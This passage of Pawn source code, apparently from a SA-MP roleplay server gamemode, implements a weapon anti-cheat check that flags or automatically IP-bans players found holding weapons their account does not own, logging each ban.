            PlayerInfo[playerid][pVW] = 0;
            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pInt] = 0;
            SetPlayerInterior(playerid, 0);
            InsideShamal[playerid] = INVALID_VEHICLE_ID;
        }
    }
	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
	return 1;
}

OnPlayerChangeWeapon(playerid, newweapon)
{
    if(pTazer[playerid] == 1) SetPlayerArmedWeapon(playerid,23);

	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		if(GetPVarInt(playerid, "EventToken") != 0) return 1;

		if(PlayerInfo[playerid][pGuns][1] != 2 && PlayerInfo[playerid][pAGuns][1] != 2 && GetPlayerWeapon(playerid) == 2)
		{
			//ExecuteHackerAction(playerid, newweapon);
		}
		else if(PlayerInfo[playerid][pGuns][1] != 3 && PlayerInfo[playerid][pAGuns][1] != 3 && GetPlayerWeapon(playerid) == 3)
		{
			ExecuteHackerAction(playerid, newweapon);
		}
		else if(PlayerInfo[playerid][pGuns][1] != 4 && PlayerInfo[playerid][pAGuns][1] != 4 && GetPlayerWeapon(playerid) == 4)
		{
  			new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
   			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
   			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
		}
		else if(PlayerInfo[playerid][pGuns][1] != 5 && PlayerInfo[playerid][pAGuns][1] != 5 && GetPlayerWeapon(playerid) == 5)
		{
			ExecuteHackerAction(playerid, newweapon);
		}
        else if(PlayerInfo[playerid][pGuns][1] != 6 && PlayerInfo[playerid][pAGuns][1] != 6 && GetPlayerWeapon(playerid) == 6)
		{
			ExecuteHackerAction(playerid, newweapon);
		}
		else if(PlayerInfo[playerid][pGuns][1] != 7 && PlayerInfo[playerid][pAGuns][1] != 7 && GetPlayerWeapon(playerid) == 7)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][1] != 8 && PlayerInfo[playerid][pAGuns][1] != 8 && GetPlayerWeapon(playerid) == 8)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][1] != 9 && PlayerInfo[playerid][pAGuns][1] != 9 && GetPlayerWeapon(playerid) == 9)
        {
  			new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
   			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
        }
        else if(PlayerInfo[playerid][pGuns][2] != 22 && PlayerInfo[playerid][pAGuns][2] != 22 && GetPlayerWeapon(playerid) == 22)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
		    {
			    new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
	            format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][2] != 23 && PlayerInfo[playerid][pAGuns][2] != 23 && GetPlayerWeapon(playerid) == 23)
        {
       		if(PlayerInfo[playerid][pConnectTime] < 2)
			{
   				new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
  			ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][2] != 24 && PlayerInfo[playerid][pAGuns][2] != 24 && GetPlayerWeapon(playerid) == 24)
        {
        	if(PlayerInfo[playerid][pConnectTime] < 2)
	    	{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s) (%d-%d-%d)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
  			ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][3] != 25 && PlayerInfo[playerid][pAGuns][3] != 25 && GetPlayerWeapon(playerid) == 25)
        {
       		if(PlayerInfo[playerid][pConnectTime] < 2)
	    	{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
  			ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][3] != 26 && PlayerInfo[playerid][pAGuns][3] != 26 && GetPlayerWeapon(playerid) == 26)
        {
    		new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
        }
        else if(PlayerInfo[playerid][pGuns][3] != 27 && PlayerInfo[playerid][pAGuns][3] != 27 && GetPlayerWeapon(playerid) == 27)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][4] != 28 && PlayerInfo[playerid][pAGuns][4] != 28 && GetPlayerWeapon(playerid) == 28)
        {
  			new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s))", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
   			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
        }
        else if(PlayerInfo[playerid][pGuns][4] != 29 && PlayerInfo[playerid][pAGuns][4] != 29 && GetPlayerWeapon(playerid) == 29)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][5] != 30 && PlayerInfo[playerid][pAGuns][5] != 30 && GetPlayerWeapon(playerid) == 30)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][5] != 31 && PlayerInfo[playerid][pAGuns][5] != 31 && GetPlayerWeapon(playerid) == 31)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][4] != 32 && PlayerInfo[playerid][pAGuns][4] != 32 && GetPlayerWeapon(playerid) == 32)
        {
  			new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
        }
        else if(PlayerInfo[playerid][pGuns][6] != 33 && PlayerInfo[playerid][pAGuns][6] != 33 && GetPlayerWeapon(playerid) == 33)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][6] != 34 && PlayerInfo[playerid][pAGuns][6] != 34 && GetPlayerWeapon(playerid) == 34)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][7] != 35 && PlayerInfo[playerid][pAGuns][7] != 35 && GetPlayerWeapon(playerid) == 35)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
            format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][7] != 36 && PlayerInfo[playerid][pAGuns][7] != 36 && GetPlayerWeapon(playerid) == 36)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
            new String[128];
			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][7] != 37 && PlayerInfo[playerid][pAGuns][7] != 37 && GetPlayerWeapon(playerid) == 37)
        {
			new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
            format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s))", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][7] != 38 && PlayerInfo[playerid][pAGuns][7] != 38 && GetPlayerWeapon(playerid) == 38)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
            new String[128];
			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][8] != 16 && PlayerInfo[playerid][pAGuns][8] != 16 && GetPlayerWeapon(playerid) == 16)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
            format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][8] != 17 && PlayerInfo[playerid][pAGuns][8] != 17 && GetPlayerWeapon(playerid) == 17)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][8] != 18 && PlayerInfo[playerid][pAGuns][8] != 18 && GetPlayerWeapon(playerid) == 18)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
            format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][8] != 39 && PlayerInfo[playerid][pAGuns][8] != 39 && GetPlayerWeapon(playerid) == 39)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
            format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][9] != 41 && PlayerInfo[playerid][pAGuns][9] != 41 && GetPlayerWeapon(playerid) == 41)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][9] != 42 && PlayerInfo[playerid][pAGuns][9] != 42 && GetPlayerWeapon(playerid) == 42)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdmCmd: %s has been banned, reason: Weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdmCmd: %s (IP:%s) was banned, reason: Weapon hacking (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][9] != 43 && PlayerInfo[playerid][pAGuns][9] != 43 && GetPlayerWeapon(playerid) == 43)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 10 && PlayerInfo[playerid][pAGuns][10] != 10 && GetPlayerWeapon(playerid) == 10)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 11 && PlayerInfo[playerid][pAGuns][10] != 11 && GetPlayerWeapon(playerid) == 11)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 12 && PlayerInfo[playerid][pAGuns][10] != 12 && GetPlayerWeapon(playerid) == 12)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 13 && PlayerInfo[playerid][pAGuns][10] != 13 && GetPlayerWeapon(playerid) == 13)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 14 && PlayerInfo[playerid][pAGuns][10] != 14 && GetPlayerWeapon(playerid) == 14)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 15 && PlayerInfo[playerid][pAGuns][10] != 15 && GetPlayerWeapon(playerid) == 15)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][11] != 44 && PlayerInfo[playerid][pAGuns][11] != 44 && GetPlayerWeapon(playerid) == 44)
        {
